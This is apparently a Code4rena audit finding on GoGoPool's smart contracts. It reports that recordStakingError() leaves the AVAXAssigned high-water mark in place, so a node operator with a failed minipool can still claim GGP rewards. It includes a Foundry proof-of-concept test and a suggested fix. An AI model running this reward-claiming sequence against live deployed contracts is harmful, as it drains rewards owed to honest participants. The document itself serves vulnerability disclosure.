# Original link
https://github.com/code-423n4/2022-12-gogopool-findings/issues/471
# Lines of code

https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L484
https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/ClaimNodeOp.sol#L56
https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/ClaimNodeOp.sol#L89


# Vulnerability details

## Impact

The [documentation](https://multisiglabs.notion.site/Architecture-Protocol-Overview-4b79e351133f4d959a65a15478ec0121) says that the NodeOps could be elegible for GGP rewards if they have a valid minipool. The problem is that if the MiniPool [has an error](https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L484) while registering the node as a validator, the NodeOp can get rewards even if the minipool had an error.

When the Rialto calls ```recordStakingError()``` function the ```AssignedHighWater``` is not reseted. So the malicious NodeOp (staker) can create pools which will have an error in the registration and get rewards from the protocol.

## Proof of Concept

I created a test in ```ClaimNodeOp.t.sol```:

1. NodeOp1 creates minipool
2. Rialto calls claimAndInitiateStaking, recordStakingStart and recordStakingError()
3. NodeOp1 withdraw his funds from minipool
4. NodeOp1 can get rewards even if there was an error with the node registration as validator.

```solidity
function testRecordStakingErrorCanGetRewards() public {
    // NodeOp can get rewards even if there was an error in registering the node as a validator
    // 1. NodeOp1 creates minipool
    // 2. Rialot/multisig claimAndInitiateStaking, recordStakingStart and recordStakingError
    // 3. NodeOp1 withdraw his funds from minipool
    // 4. NodeOp1 can get rewards even if there was an error with the node registration as validator.
    address nodeOp1 = getActorWithTokens("nodeOp1", MAX_AMT, MAX_AMT);
    uint256 duration = 2 weeks;
    uint256 depositAmt = 1000 ether;
    uint256 avaxAssignmentRequest = 1000 ether;
    skip(dao.getRewardsCycleSeconds());
    rewardsPool.startRewardsCycle();
    //
    // 1. NodeOp1 creates minipool
    //
    vm.startPrank(nodeOp1);
    ggp.approve(address(staking), MAX_AMT);
    staking.stakeGGP(200 ether);
    MinipoolManager.Minipool memory mp1 = createMinipool(depositAmt, avaxAssignmentRequest, duration);
    vm.stopPrank();
    address liqStaker1 = getActorWithTokens("liqStaker1", MAX_AMT, MAX_AMT);
    vm.prank(liqStaker1);
    ggAVAX.depositAVAX{value: MAX_AMT}();
    //
    // 2. Rialto/multisig claimAndInitiateStaking, recordStakingStart and recordStakingError
    //
    vm.prank(address(rialto));
    minipoolMgr.claimAndInitiateStaking(mp1.nodeID);
    bytes32 txID = keccak256("txid");
    vm.prank(address(rialto));
    minipoolMgr.recordStakingStart(mp1.nodeID, txID, block.timestamp);
    bytes32 errorCode = "INVALID_NODEID";
    int256 minipoolIndex = minipoolMgr.getIndexOf(mp1.nodeID);
    skip(2 weeks);
    vm.prank(address(rialto));
    minipoolMgr.recordStakingError{value: depositAmt + avaxAssignmentRequest}(mp1.nodeID, errorCode);
    assertEq(vault.balanceOf("MinipoolManager"), depositAmt);
    MinipoolManager.Minipool memory mp1Updated = minipoolMgr.getMinipool(minipoolIndex);
    assertEq(mp1Updated.avaxTotalRewardAmt, 0);
    assertEq(mp1Updated.errorCode, errorCode);
    assertEq(mp1Updated.avaxNodeOpRewardAmt, 0);
    assertEq(mp1Updated.avaxLiquidStakerRewardAmt, 0);
    assertEq(minipoolMgr.getTotalAVAXLiquidStakerAmt(), 0);
    assertEq(staking.getAVAXAssigned(mp1Updated.owner), 0);
    // The highwater doesnt get reset in this case
    assertEq(staking.getAVAXAssignedHighWater(mp1Updated.owner), depositAmt);
    //
    // 3. NodeOp1 withdraw his funds from the minipool
    //
    vm.startPrank(nodeOp1);
    uint256 priorBalance_nodeOp = nodeOp1.balance;
    minipoolMgr.withdrawMinipoolFunds(mp1.nodeID);
    assertEq((nodeOp1.balance - priorBalance_nodeOp), depositAmt);
    vm.stopPrank();
    //
    // 4. NodeOp1 can get rewards even if there was an error with the node registration as validator.
    //
    skip(2629756);
    vm.startPrank(address(rialto));
    assertTrue(nopClaim.isEligible(nodeOp1)); //<- The NodeOp1 is eligible for rewards
    nopClaim.calculateAndDistributeRewards(nodeOp1, 200 ether);
    vm.stopPrank();
    assertGt(staking.getGGPRewards(nodeOp1), 0);
    vm.startPrank(address(nodeOp1));
    nopClaim.claimAndRestake(staking.getGGPRewards(nodeOp1)); //<- Claim nodeOp1 rewards
    vm.stopPrank();
}
```

## Tools used

Foundry/VsCode

## Recommended Mitigation Steps

The ```MinipoolManager.sol::recordStakingError()``` function should reset the Assigned high water ```staking.resetAVAXAssignedHighWater(stakerAddr);``` so the user can not claim rewards for a minipool with errors.